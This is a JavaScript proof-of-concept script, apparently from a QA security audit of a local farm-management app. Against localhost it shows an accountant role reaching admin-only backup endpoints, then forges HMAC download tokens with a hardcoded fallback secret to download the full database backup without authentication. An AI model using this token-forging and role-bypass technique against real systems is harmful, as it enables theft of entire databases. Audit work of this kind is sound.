// Prove: (A) accountant can drive the whole backup module (no RolesGuard), and
// (B) ANYONE unauthenticated can download the full DB by FORGING a download token with the
// hardcoded fallback secret 'fallback-secret-change-in-env' (BACKUP_DOWNLOAD_SECRET unset).
import { request } from 'file:///E:/DEV/Chicken%20FMS/.qa-audit/harness/client.mjs';
import crypto from 'node:crypto';
import fs from 'node:fs';
const BASE = 'http://localhost:3125/v1';
const P = JSON.parse(fs.readFileSync(new URL('./principals.json', import.meta.url)));
const admin = P.admin.token, acc = P.accountant.token;

const FALLBACK_SECRET = 'fallback-secret-change-in-env';
function forgeToken(backupId, ttl = 300) {
  const payload = { backupId, exp: Math.floor(Date.now() / 1000) + ttl };
  const b64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', FALLBACK_SECRET).update(b64).digest('base64url');
  return `${b64}.${sig}`;
}

async function main() {
  // Create a backup as ADMIN so a real archive exists
  const mk = await request(BASE, 'POST', '/system/backup', { token: admin, body: {} });
  console.log('[admin] POST /system/backup ->', mk.status);
  await new Promise((r) => setTimeout(r, 3000)); // let it finish

  // (A) Accountant lists backups (no RolesGuard)
  const accList = await request(BASE, 'GET', '/system/backups', { token: acc });
  console.log('[accountant] GET /system/backups ->', accList.status,
    '| runs:', Array.isArray(accList.data) ? accList.data.length : JSON.stringify(accList.data).slice(0,80));
  const runs = Array.isArray(accList.data) ? accList.data : (accList.data?.items || accList.data?.runs || []);
  const done = runs.find((r) => (r.status === 'completed' || r.status === 'success' || r.filePath || r.fileName)) || runs[0];
  const backupId = done?.id;
  console.log('target backupId =', backupId, '| row:', JSON.stringify(done)?.slice(0,160));

  // (A2) Accountant mints an official signed download link (createDownloadLink has @Roles admin but NO RolesGuard)
  if (backupId != null) {
    const link = await request(BASE, 'POST', `/system/backups/${backupId}/download-link`, { token: acc, body: {} });
    console.log('[accountant] POST download-link ->', link.status, '| url:', JSON.stringify(link.data)?.slice(0,160));
  }

  // (B) UNAUTHENTICATED download with a FORGED token
  if (backupId != null) {
    const forged = forgeToken(backupId);
    const res = await fetch(`http://localhost:3125/v1/system/backups/${backupId}/download?token=${forged}`);
    const buf = Buffer.from(await res.arrayBuffer());
    console.log('[UNAUTH+forged token] GET download ->', res.status,
      '| content-type:', res.headers.get('content-type'),
      '| bytes:', buf.length);
    if (res.status === 200 && buf.length > 0) {
      const magic = buf.slice(0, 2).toString('hex');
      console.log('  >>> EXFIL SUCCESS: downloaded', buf.length, 'bytes, gzip magic=', magic, '(1f8b = gzip)');
      fs.writeFileSync(new URL('./r2-exfil-proof.gz', import.meta.url), buf);
    } else {
      console.log('  body:', buf.toString('utf8').slice(0, 200));
    }
  }

  // Control: forged token with WRONG secret must fail
  if (backupId != null) {
    const b64 = Buffer.from(JSON.stringify({ backupId, exp: Math.floor(Date.now()/1000)+300 })).toString('base64url');
    const badSig = crypto.createHmac('sha256', 'definitely-not-the-secret').update(b64).digest('base64url');
    const res2 = await fetch(`http://localhost:3125/v1/system/backups/${backupId}/download?token=${b64}.${badSig}`);
    console.log('[control: wrong-secret token] ->', res2.status, '(expect 401)');
  }
}
main().catch((e) => { console.error('FATAL', e); process.exit(1); });
